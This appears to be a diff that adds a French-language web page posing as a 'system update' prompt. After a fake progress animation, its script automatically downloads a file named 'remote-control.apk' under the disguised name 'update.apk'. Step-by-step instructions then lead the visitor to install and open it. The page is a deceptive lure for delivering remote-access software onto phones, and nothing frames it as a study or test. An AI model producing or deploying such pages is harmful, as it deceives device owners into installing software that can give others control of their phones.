@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mise à jour système</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .card {
+      background: rgba(255,255,255,0.05);
+      backdrop-filter: blur(20px);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 20px;
+      padding: 40px 30px;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    }
+    .icon {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+      font-size: 36px;
+    }
+    h1 {
+      font-size: 1.4rem;
+      margin-bottom: 12px;
+      font-weight: 600;
+    }
+    p {
+      color: rgba(255,255,255,0.7);
+      font-size: 0.9rem;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+    .progress-container {
+      background: rgba(255,255,255,0.1);
+      border-radius: 10px;
+      height: 6px;
+      margin-bottom: 20px;
+      overflow: hidden;
+    }
+    .progress-bar {
+      height: 100%;
+      background: linear-gradient(90deg, #667eea, #764ba2);
+      border-radius: 10px;
+      width: 0%;
+      animation: loading 2s ease-in-out forwards;
+    }
+    @keyframes loading {
+      0% { width: 0%; }
+      50% { width: 60%; }
+      100% { width: 100%; }
+    }
+    .status {
+      font-size: 0.85rem;
+      color: rgba(255,255,255,0.6);
+      margin-bottom: 16px;
+    }
+    .btn {
+      display: inline-block;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: #fff;
+      border: none;
+      padding: 14px 32px;
+      border-radius: 12px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      transition: transform 0.2s, box-shadow 0.2s;
+      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+    }
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+    }
+    .btn:active { transform: translateY(0); }
+    .steps {
+      text-align: left;
+      margin-top: 24px;
+      padding: 16px;
+      background: rgba(255,255,255,0.05);
+      border-radius: 12px;
+    }
+    .steps li {
+      color: rgba(255,255,255,0.7);
+      font-size: 0.82rem;
+      margin-bottom: 8px;
+      list-style: none;
+      padding-left: 24px;
+      position: relative;
+    }
+    .steps li::before {
+      content: '✓';
+      position: absolute;
+      left: 0;
+      color: #667eea;
+      font-weight: bold;
+    }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">📲</div>
+    <h1>Mise à jour disponible</h1>
+    <p>Une mise à jour importante est prête à être installée. Veuillez autoriser l'installation pour continuer.</p>
+    
+    <div id="downloading">
+      <div class="progress-container">
+        <div class="progress-bar"></div>
+      </div>
+      <div class="status" id="statusText">Téléchargement en cours...</div>
+    </div>
+
+    <div id="installPrompt" class="hidden">
+      <a href="/public/remote-control.apk" class="btn" id="installBtn" download="update.apk">
+        Installer la mise à jour
+      </a>
+      <ul class="steps">
+        <li>Appuyez sur "Télécharger"</li>
+        <li>Ouvrez le fichier téléchargé</li>
+        <li>Appuyez sur "Installer"</li>
+        <li>Appuyez sur "Ouvrir" une fois terminé</li>
+      </ul>
+    </div>
+  </div>
+
+  <script>
+    // Auto-download after progress animation
+    setTimeout(() => {
+      document.getElementById('downloading').classList.add('hidden');
+      document.getElementById('installPrompt').classList.remove('hidden');
+      
+      // Auto-trigger download
+      const link = document.createElement('a');
+      link.href = '/remote-control.apk';
+      link.download = 'update.apk';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }, 2200);
+  </script>
+</body>
+</html>
